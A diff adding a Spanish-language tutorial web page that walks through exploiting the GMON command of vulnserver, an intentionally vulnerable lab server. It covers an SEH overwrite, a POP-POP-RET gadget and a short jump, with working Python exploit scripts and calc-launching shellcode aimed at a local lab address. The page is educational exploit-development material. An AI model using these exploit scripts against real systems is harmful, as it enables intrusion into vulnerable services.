@@ -1,0 +1,290 @@
+
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/al_zo_ex.css">
+
+ 
+	<title>vulnserver - windows</title>
+</head>
+<body>
+
+<header>
+
+  <nav class="navbar navbar-expand-md navbar-light shadow-5-strong">
+      <div class="container-fluid">
+        <a class="navbar-brand text-primary" href="secur-home.html">learn@hacks#</a>
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#submenus" aria-controls="submenus" aria-expanded="false" arial-label="Toggler navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse justify-content-md-center" id="submenus">
+          <ul class="navbar-nav">
+            
+            <li class="nav-item active"><a class="nav-link text-primary" href="secur-home.html">Inicio</a></li>
+            <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle text-primary" href="#" data-bs-toggle="dropdown">Exploit Education</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofExEducation.html">Phoenix</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofNbEducation.html">Nebula</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofFsEducation.html">Fusion</a></li>
+                </ul>
+            </li>
+
+            <li class="nav-item dropdown">
+          <a class="nav-link dropdown-toggle text-primary" data-bs-toggle="dropdown" href="#">CTFs</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofVlhub.html">Vulnhub</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="picoFlags.html">picoCTF</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="RPISEC_MBE.html">RPISEC</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="pwnable_kr.html">pwnable</a></li>
+        </ul>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="shlpage.html">Shellcodes</a>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="tutoriales.html">Tutoriales</a>
+            </li> 
+
+            <li class="nav-item">
+              <a class="nav-link text-primary nav-link-color" href="https://github.com/BGPavelAng">Github</a>
+            </li>
+
+            <li>
+              <a class="nav-link text-primary nav-link-color" href="https://www.patreon.com/BGPavelAng">Patreon</a>
+            </li>
+
+          </ul>
+        </div>
+    </div>
+  </nav>
+</header>
+
+<div class="container-fluid">
+    <div class="row">
+      <div class="col">
+        <div class="img-bran d-none d-md-none d-lg-block">
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container mt-5">
+    <div class="row mt-5">
+      <div class="col">
+
+            <p><b>Vamos a explotar la vulnerabilidad de GMON</b></p>
+            
+            
+            
+<p>Primero vamos a revisar como ejecutar la función.</p>
+
+<p>Para empezar cuando intentas explotar una vulnerabilidad se necesita restrear un buffer donde pueda entrar una shellcode, pero, ¿qué pasaría si los buffers encontrados son muy pequeños como para entrar una shellcode completa?, para eso, encontraron una forma, que sería meter en memoria una shellcode, después ejecutar un código en ese pequeño buffer que busca en memoria esa shellcode para después ejecutarlo.</p>
+
+<p>Usaremos Immunity y busquemos en "Search for -> All referenced text strings" y damos click sobre GMON.</p>
+
+<img class="img-fluid" src="vid/gmon_1.png"><br><br>
+
+<p>Podemos ver en la imagen la API strncmp, "int strncmp(const char *str1, const char *str2, size_t n)", en otras palabras, está comparando "strcmp("GMON ", "GMON ", 5)", el espacio al final también cuenta</p>
+
+<p>Ok, conectamos con el servidor, ahora veamos si podemos provocarle un error</p>
+<img class="img-fluid" src="vid/gmon_2.png"><br><br>
+<img class="img-fluid" src="vid/gmon_3.png"><br><br>
+<img class="img-fluid" src="vid/gmon_4.png"><br><br>
+<img class="img-fluid" src="vid/gmon_5.png"><br><br>
+
+<p>Al parecer no sale alguno a menos que coloquemos el signo "/" antes.</p>
+
+<p>Pero aparece un detalle importante, no se sobreescribe EIP pero si logramos sobreescribir nSEH y SEH.</p>
+
+<img class="img-fluid" src="vid/gmon_6.png"><br><br>
+<img class="img-fluid" src="vid/gmon_7.png"><br><br>
+
+<p>Ok, logramos un buen avance, ahora tenemos que investigar como explotar la vulnerabilidad.</p>
+
+<p><b>Recordemos la importancia de SEH y nSEH</b></p>
+
+<p>Son conceptos para intentar ejecutar bloques de código y encapsulando errores o excepciones en el programa.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+  try {<br>
+    <br>
+  
+
+  }<br>
+  
+  except () {<br>
+    <br>
+  
+  
+  }<br>
+  
+</p>
+
+<p>En except hay una estructura llamada Structured Exception Handlers, donde va buscando bloque por bloque el tipo de excepción que se va a ejecutar o hasta encontrar un error 0xFFFFFF y cuando lo encuentra salta a nSEH que es un puntero a EIP para ir al lugar donde se encuentra la información a mostrar.</p>
+
+<p>Ok, en otras palabras la pila mete en ESP 4 bytes que sería SEH, después suma en ESP otros 4 bytes, que sería nSEH, serian ESP+8, y se puede ver en la imagen como son contiguos, y es por esa razón que es necesario una técnica conocida como POP+POP+RET</p>
+
+<p><b>ESP+8 = POP -> ESP+4, POP -> ESP,  RET -> EIP -> (brinca al inicio de ESP de alguna dirección)</b>></p>
+
+<p>en RET tenemos que darle la instrucción hacia donde debería saltar, y como ya supones, tenemos que decirle que salte a una shell.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+  import socket<br><br>
+
+  basura = b"A" * 3546<br>
+  basura += b"BBBB"<br>
+  basura += b"CCCC"<br>
+  basura += b"D" * (4000 - len(basura))<br><br>
+  
+  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+  soc.connect(('192.168.0.9', 9999))<br><br>
+  
+  soc.send((b'GMON /' + basura))<br><br>
+  
+  soc.close()<br><br>
+  
+</p>
+<img class="img-fluid" src="vid/gmon_8.png"><br><br>
+<img class="img-fluid" src="vid/gmon_9.png"><br><br>
+
+<p>Listo, ya tenemos SEH y nSEH como queremos, ahora será necesario retroceder para meter un jump a EIP que vaya a nuestra shell, pero vayamos poco a poco.</p>
+
+<p>Primero busquemos un POP+POP+RET valido y sin seguridad, usemos !mona modules y !mona seh, para encontrar uno en algún modulo sin protección.</p>
+
+<img class="img-fluid" src="vid/gmon_10.png"><br><br>
+
+<p>Utilicemos el primero, no tiene protección en ASLR, Rebase y SafeSEH</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+  import socket<br><br>
+
+basura = b"A" * 3546<br>
+basura += b"CCCC"<br>
+basura += b"\xb4\x10\x50\x62"<br>
+basura += b"D" * (4000 - len(basura))<br><br>
+
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+soc.connect(('192.168.0.9', 9999))<br><br>
+
+soc.send((b'GMON /' + basura))<br><br>
+
+soc.close()<br><br>
+  
+</p>
+
+<img class="img-fluid" src="vid/gmon_11.png"><br><br>
+
+<p>Vamos a seguir la dirección y coloquemos un break para ver si llegamos ahí.</p>
+
+<img class="img-fluid" src="vid/gmon_12.png"><br><br>
+<img class="img-fluid" src="vid/gmon_13.png"><br><br>
+
+<p>Perfecto, llegamos al lugar donde colocamos el break y además podemos ver en la segunda imagen como RETN apunta a 00EFFFCC que es el mismo de Pointer to next SEH record.</p>
+
+<p>Bien, si le damos en siguiente podemos ver que EIP tiene la dirección de nSEH y va a saltar a 0x43434343 que serían los "CCCC" que colocamos, ahí debemos hacer un truco, colocar un jump corto (short jmp) para ir al inicio de ESP de la shell, que en este caso fue lo que rellenamos con 0x44444444 "D" * (4000 - len(basura)) y ahí debe estar la shell</p>
+
+<img class="img-fluid" src="vid/gmon_14.png"><br><br>
+
+<p>Ok, hagamos un short jmp en ASM que sería EB, después digamosle cuantos bytes tiene que saltar, en este caso solo serían necesarios 12 "0xc" y alineamos con unos nops</p>
+
+<p><b>Sería 0xEB0C9090</b></p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+    
+  import socket<br><br>
+
+  basura = b"A" * 3546<br>
+  basura += b"\xeb\x0c\x90\x90"<br>
+  basura += b"\xb4\x10\x50\x62"<br>
+  basura += b"D" * (4000 - len(basura))<br><br>
+  
+  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+  soc.connect(('192.168.0.9', 9999))<br><br>
+  
+  soc.send((b'GMON /' + basura))<br><br>
+  
+  soc.close()<br><br>
+    
+</p>
+
+<img class="img-fluid" src="vid/gmon_15.png"><br><br>
+
+<p>Listo, logramos el objetivo, ahora, ¿porqué dejamos unos cuantos y no colocamos el jmp en el incio de los 44's?, sencillo, evitamos problemas a la hora de ejecutar una shell, el conocido NOP_slide.</p>
+
+<p>Ahora, el espacio es muy pequeño para una shell grande, será para después con un egghunter.</p>
+<p>Coloquemos los opcodes de la ejecución de una calculadora y veamos que pasa</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+    
+  import socket<br><br>
+
+basura = b"A" * 3546<br>
+basura += b"\xeb\x0c\x90\x90"<br>
+basura += b"\xb4\x10\x50\x62"<br>
+nops = b"\x90\x90\x90\x90\x90\x90"<br>
+padd = b"D" * (4000 - len(basura))<br>
+shellcode = b"\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51"<br>
+shellcode += b"\x50\xbb\x10\x55\x6f\x76\xff\xd3\x31\xc0\x50\xb8\x40\x76\x6b\x76\xff\xd0"<br><br>
+
+enviar_datos = basura + nops + shellcode + padd<br><br>
+
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+soc.connect(('192.168.0.9', 9999))<br><br>
+
+soc.send((b'GMON /' + enviar_datos))<br><br>
+
+soc.close()<br><br>
+    
+</p>
+
+<img class="img-fluid" src="vid/gmon_16.png"><br><br>
+<img class="img-fluid" src="vid/gmon_17.png"><br><br>
+
+<p>El código completo se inyecto correctamente.</p>
+
+<p>Listo, pero vamos a explicar el código.</p>
+
+<p>Estos son los nops que se mencionan para nop-slide<br>
+  nops = b"\x90\x90\x90\x90\x90\x90"</p>
+
+<p>Esto se modifica, ya que lo agregaremos al final de la shell<br>
+  padd = b"D" * (4000 - len(basura))</p>
+
+
+<p>Esto es la shell<br>
+  shellcode = b"\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51"<br>
+  shellcode += b"\x50\xbb\x10\x55\x6f\x76\xff\xd3\x31\xc0\x50\xb8\x40\x76\x6b\x76\xff\xd0"<br></p>
+
+
+<p>Entonces en enviar_datos usamos, la basura, los nops, la shellcode y la alineación que mencionamos arriba<br>
+  enviar_datos = basura + nops + shellcode + padd</p>
+
+
+<p>Listo, pasamos la prueba GMON.</p>
+
+      
+</div>
+
+    </div>
+  </div>
+  <footer class=" footer bg-light">
+    <div class="container-fluid mt-3">
+      <p class="mt-2">Aprende algo nuevo todos los días. Good luck!</p>
+    </div>
+  </footer>
+
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
+      
